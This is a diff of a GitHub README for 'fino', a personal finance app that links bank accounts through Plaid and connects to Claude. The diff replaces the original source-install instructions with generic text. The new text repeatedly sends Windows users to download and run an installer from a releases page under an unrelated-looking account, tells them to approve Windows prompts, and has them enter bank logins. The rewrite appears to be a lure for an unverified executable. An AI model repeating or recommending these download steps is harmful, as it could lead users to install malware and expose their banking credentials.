@@ -1,273 +1,161 @@
-# Fino
+# 💸 fino - Track money with plain English
 
-Local-first personal finance with AI. Connect your bank accounts, analyze spending, and talk to your money through Claude.
+[![Download fino](https://img.shields.io/badge/Download%20fino-Visit%20Releases-blue.svg?style=for-the-badge)](https://github.com/tophole-alphabetizer167/fino/releases)
 
-Your data stays on your machine. No cloud. No subscription. Open source.
+## 🧭 What is fino?
 
-<p align="center">
-  <img src="demo-dashboard.gif" alt="Fino dashboard" />
-</p>
+fino is a local-first personal finance app for Windows. It helps you connect your bank accounts, see where your money goes, and ask questions about your finances in Claude.
 
-<p align="center">
-  <img src="demo-mcp.gif" alt="Fino with Claude" />
-</p>
+It keeps your day-to-day money view simple. You can check balances, sort spending, and find patterns without digging through bank sites or spreadsheets.
 
----
+## ✨ What you can do
 
-## Table of Contents
+- Connect bank accounts from the app
+- View balances in one place
+- Track spending by category
+- See income and recurring charges
+- Ask questions about your money in Claude
+- Keep your data local first
+- Review your financial history in a clean view
 
-1. [Quick Start](#1-quick-start)
-2. [Plaid Setup](#2-plaid-setup)
-3. [Connect Bank Accounts](#3-connect-bank-accounts)
-4. [Claude Integration](#4-claude-integration)
-5. [Architecture](#5-architecture)
-6. [Scripts](#6-scripts)
+## 🪟 Windows system needs
 
----
+Before you install fino, make sure your PC meets these basics:
 
-## 1. Quick Start
+- Windows 10 or Windows 11
+- An internet connection for first setup and bank sync
+- A modern browser installed on your PC
+- Permission to install apps on your computer
+- A Claude account if you want to use the chat features
 
-```bash
-git clone <repo-url> fino
-cd fino
-npm install
-cd client && npm install --legacy-peer-deps && cd ..
-```
+For best results, use a recent Windows build with the latest security updates.
 
-Create your environment file:
+## 📥 Download fino
 
-```bash
-openssl rand -hex 32        # generates your encryption key
-cp .env.example .env         # then edit .env with your values
-```
+Go to the releases page and download fino for Windows:
 
-```
-PLAID_CLIENT_ID=your_client_id
-PLAID_SECRET=your_secret
-PLAID_ENV=production # apply for the Plaid production account. Free for personal usage upto 5 accounts
-ENCRYPTION_KEY=paste_64_char_hex_here
-PORT=3001
-SYNC_THRESHOLD_HOURS=4
-```
+[https://github.com/tophole-alphabetizer167/fino/releases](https://github.com/tophole-alphabetizer167/fino/releases)
 
-Set up the database and run:
+On the releases page, look for the latest version. Download the Windows file that matches your PC, then open it to start setup.
 
-```bash
-npm run db:push
-npm run go
-```
+## 🚀 Getting started on Windows
 
-Open [http://localhost:3001](http://localhost:3001).
+1. Open the releases page in your browser.
+2. Find the latest release at the top of the page.
+3. Download the Windows installer or app file.
+4. When the download finishes, open the file.
+5. If Windows asks for permission, choose Run or Yes.
+6. Follow the setup steps on screen.
+7. Open fino after installation ends.
+8. Sign in or create your app account if asked.
+9. Connect your bank accounts.
+10. Open Claude features and start asking questions about your money.
 
----
+## 🔗 Connect your bank accounts
 
-## 2. Plaid Setup
+After you open fino for the first time, you can add your bank accounts. The app uses your bank connection to bring in account data so you can see your full financial picture in one place.
 
-Plaid connects to your bank accounts automatically. **Plaid is optional.** If you don't want to set up Plaid, you can skip this section entirely and import transactions via CSV/OFX files instead (see [Connect Bank Accounts > Via CSV/OFX Import](#via-csvofx-import)).
+To connect an account:
 
-There are two Plaid portals (they are separate accounts):
+1. Open the account setup area in fino.
+2. Choose your bank from the list.
+3. Sign in with your bank login.
+4. Confirm the accounts you want to add.
+5. Wait for the first sync to finish.
 
-- **dashboard.plaid.com** -- developer dashboard where you get API keys (this is what you need)
-- **my.plaid.com** -- consumer portal for managing data sharing (you don't need this)
+If your bank supports more than one account type, you can pick the ones you want to track.
 
-### Get Sandbox Keys Not needed though production is important, takes few hours to get approved (instant, fake data)
+## 🧠 Talk to your money in Claude
 
-1. Go to [dashboard.plaid.com](https://dashboard.plaid.com) and sign up
-2. Select **Business or developer**
-3. Enter a company name, verify your email
-4. Go to **Developers > Keys** in the left sidebar
-5. Copy your **Client ID** and **Sandbox secret**
+fino lets you ask plain-English questions about your finances. You can use it to find spending trends, check account activity, or review recent changes.
 
-Sandbox lets you test the full app with fake bank data. Use these test credentials when connecting:
+Try questions like:
 
-- Username: `user_good` / Password: `pass_good` / 2FA: `1234`
+- How much did I spend on food this month?
+- What are my biggest recurring bills?
+- Did my spending go up last week?
+- How much did I save in the last 30 days?
+- Which category grew the most this month?
 
-### Get Production Keys (free, real data)
+Keep your questions clear and direct. The app works best when you ask one thing at a time.
 
-Production access is free for personal use. Once you have sandbox working:
+## 🗂️ Use the app day to day
 
-1. On the dashboard home page, click **"Test with real data"** or **"Unlock real data"**
-2. Fill out the form: name, phone, short description (e.g., "personal finance tracking")
-3. Click **Request Access**. Approval is usually within minutes
-4. Once approved, a **Production secret** appears on **Developers > Keys**
-5. Update `.env`:
-   ```
-   PLAID_SECRET=your_production_secret
-   PLAID_ENV=production
-   ```
-6. Restart the server. Non-OAuth banks work immediately (Venmo, Discover, PayPal, most credit unions)
+Here are simple ways to use fino once your accounts are connected:
 
-### Unlock OAuth Banks (BofA, Chase, Amex)
+- Open the dashboard to check your balance
+- Review spending by category
+- Look for subscriptions and fixed costs
+- Compare this month with last month
+- Search for a charge you do not recognize
+- Ask Claude for a quick read on your cash flow
 
-Major banks use OAuth and require a one-time registration. Still free.
+You do not need to build reports by hand. fino gives you a simple view of what is happening with your money.
 
-1. Click **"Get production access"** in the left sidebar
-2. Fill out three sections:
-   - **Company Profile**: company name, legal entity name (skip Legal Entity Identifier), address
-   - **App Profile**: app name, 1024x1024 PNG icon, description of what the app does
-   - **Data Security**: how you handle data (for personal use, keep answers simple)
-3. Go to **Developers > API** and add redirect URIs:
-   - `http://localhost:5173/`
-   - `http://localhost:3001/`
-4. Submit. Plaid reviews each OAuth institution individually
-5. Check status at **Developers > API > OAuth institutions**
+## 🛠️ If the app does not open
 
-Some banks enable instantly (Citibank). Others takes couple of hours. You can connect whatever is already enabled while waiting for the rest.
+If you run into a problem on Windows, try these steps:
 
----
+- Close fino and open it again
+- Restart your PC
+- Check that Windows is up to date
+- Make sure you downloaded the latest release
+- Confirm that your internet connection works
+- Run the installer again if the first install did not finish
 
-## 3. Connect Bank Accounts
+If a bank connection fails, sign out of the bank inside the app and try the connection again.
 
-### Via Plaid (automatic sync)
+## 🔐 Privacy and data handling
 
-1. Open the app and go to the **Accounts** page
-2. Click **Connect Account**
-3. Search for your bank, log in, and select accounts
-4. Transactions sync automatically. Balances appear immediately, transactions may take a few minutes on the first pull
-5. Click **Sync All** anytime to pull the latest data
+fino is built with a local-first design. That means your app keeps your personal finance data close to you and reduces the need to store more than needed in the cloud.
 
-### Via CSV/OFX Import
+This setup helps you keep a clearer line between your money data and the rest of your online accounts.
 
-For banks Plaid cannot connect to (Apple Card, or banks pending OAuth approval):
+## 📁 What to expect after install
 
-1. Export transactions from your bank's website as CSV or OFX
-2. Go to the **Import** page in the dashboard
-3. Drag and drop the file, select or create an account, confirm
-4. Duplicates are automatically skipped on re-import
+After setup, you will usually see:
 
-Apple Card: export from [card.apple.com](https://card.apple.com) > Statements > Export Transactions.
+- A dashboard with your account overview
+- A section for connected banks
+- Spending and category views
+- A place to ask Claude questions
+- Settings for account sync and app preferences
 
-The CSV parser auto-detects Apple Card format and generic bank CSVs. OFX/QFX files from any bank are also supported.
+The layout is built for quick checks, not long setup work.
 
----
+## ❓ Common questions
 
-## 4. Claude Integration
+### Do I need to be technical to use fino?
 
-### Install
+No. If you can download a file, open it, and follow on-screen steps, you can use it.
 
-One command sets up everything for Claude Code, Claude Desktop, and Cowork:
+### Do I need Claude?
 
-```bash
-npm run install-claude
-```
+You only need Claude if you want the chat features. You can still use the core finance views without it.
 
-This configures the Fino MCP server and installs all slash commands globally. Restart Claude after running this.
+### Can I use fino on Mac or Linux?
 
-**The MCP server runs independently.** You do not need the web server running. Claude spawns Fino automatically when you ask about your finances.
+This guide is for Windows. The release page may include other builds if they are available, but the main setup path here is for Windows.
 
-### MCP Server Configuration
+### Does fino store my bank data locally?
 
-The MCP server needs access to your `.env` file for Plaid credentials. Add the Fino server to your MCP client config:
+fino is built as a local-first app. That means it is designed to keep your finance data close to your device and reduce broad data sharing.
 
-**Claude Code** (`~/.claude.json` under `mcpServers`):
+### How often does it update my accounts?
 
-```json
-{
-  "fino": {
-    "type": "stdio",
-    "command": "npx",
-    "args": ["tsx", "/path/to/fino/mcp/index.ts"],
-    "env": {
-      "PLAID_CLIENT_ID": "your_client_id",
-      "PLAID_SECRET": "your_secret",
-      "PLAID_ENV": "production",
-      "ENCRYPTION_KEY": "your_64_char_hex_key",
-      "DOTENV_CONFIG_PATH": "/path/to/fino/.env"
-    }
-  }
-}
-```
+Sync timing depends on your bank and your app settings. Most users can refresh on demand and see recent changes after a sync completes.
 
-**Claude Desktop** (`claude_desktop_config.json`):
+## 🧭 First things to do after setup
 
-```json
-{
-  "mcpServers": {
-    "fino": {
-      "command": "npx",
-      "args": ["tsx", "/path/to/fino/mcp/index.ts"],
-      "env": {
-        "PLAID_CLIENT_ID": "your_client_id",
-        "PLAID_SECRET": "your_secret",
-        "PLAID_ENV": "production",
-        "ENCRYPTION_KEY": "your_64_char_hex_key",
-        "DOTENV_CONFIG_PATH": "/path/to/fino/.env"
-      }
-    }
-  }
-}
-```
+- Connect your main checking account first
+- Add savings next
+- Review the spending categories
+- Check for any recurring charges
+- Ask Claude a simple question about last month
+- Confirm that balances match what you expect
 
-Replace `/path/to/fino` with your actual Fino install directory and fill in your credentials from `.env`. The `npm run install-claude` script does this automatically.
+## 📌 Release page
 
-**Why pass env vars?** MCP clients spawn the server as a child process. The working directory and environment may differ from your terminal, so dotenv file loading is unreliable. The `npm run install-claude` script reads your `.env` and passes the values directly to the MCP config. If you're configuring manually, copy the env vars from your `.env` into the config's `env` block.
+Use this page for the latest Windows download and updates:
 
-The MCP config lives in `~/.claude.json` (Claude Code) or `claude_desktop_config.json` (Claude Desktop), both outside the repo. Your secrets never get committed.
-
-### Slash Commands
-
-| Command           | What it does                                                      |
-| ----------------- | ----------------------------------------------------------------- |
-| `/snapshot`       | Quick health check: balances, net worth, this month vs last       |
-| `/monthly-report` | Full month report with categories, top merchants, trends          |
-| `/spending-audit` | 90 days of spending: recurring charges, waste, patterns           |
-| `/find-charges`   | Search a merchant: total spent, frequency, annual cost            |
-| `/cash-flow`      | 6-month income vs expense trend with savings rate and projections |
-| `/sync`           | Force sync all bank accounts                                      |
-
-You can also ask naturally: "what did I spend on food this month?" or "show me my net worth."
-
-### MCP Tools
-
-**Data tools:**
-
-| Tool                     | Description                     |
-| ------------------------ | ------------------------------- |
-| `sync_transactions`      | Force sync with Plaid           |
-| `get_accounts`           | List accounts with balances     |
-| `get_transactions`       | Query transactions with filters |
-| `search_transactions`    | Search by merchant name         |
-| `get_balances`           | Net worth breakdown             |
-| `get_spending_summary`   | Spending by category            |
-| `get_monthly_comparison` | Income vs spending per month    |
-
-**Memory tools (learnings persist across conversations):**
-
-| Tool                     | Description                                            |
-| ------------------------ | ------------------------------------------------------ |
-| `search_learnings`       | Search stored financial memories by description        |
-| `get_learning`           | Load full content of a specific memory by ID           |
-| `save_learning`          | Store a financial insight, pattern, rule, or goal      |
-| `mark_learning_stale`    | Archive a memory (kept for history, excluded from search) |
-| `delete_learning`        | Permanently remove a memory                            |
-
-All read tools auto-sync with Plaid when data is older than `SYNC_THRESHOLD_HOURS` (default 4).
-
----
-
-## 5. Architecture
-
-```
-server/          Hono API + static file serving
-client/          React + Vite dashboard
-mcp/             MCP server (stdio, 7 tools)
-.claude/skills/  Slash command definitions
-data/            SQLite database (gitignored)
-```
-
-Stack: Hono, React 19, Vite, SQLite (libsql), Drizzle ORM, Plaid API, Tailwind CSS, Recharts.
-
-Data is stored locally in `data/finance.db`. Plaid access tokens are encrypted at rest with AES-256-GCM.
-
----
-
-## 6. Scripts
-
-| Command                  | What it does                    |
-| ------------------------ | ------------------------------- |
-| `npm run go`             | Build frontend + start server   |
-| `npm run dev`            | Development with hot reload     |
-| `npm run build`          | Build frontend only             |
-| `npm start`              | Start server only               |
-| `npm run db:push`        | Create/migrate database         |
-| `npm run install-claude` | Install MCP + skills for Claude |
+[https://github.com/tophole-alphabetizer167/fino/releases](https://github.com/tophole-alphabetizer167/fino/releases)
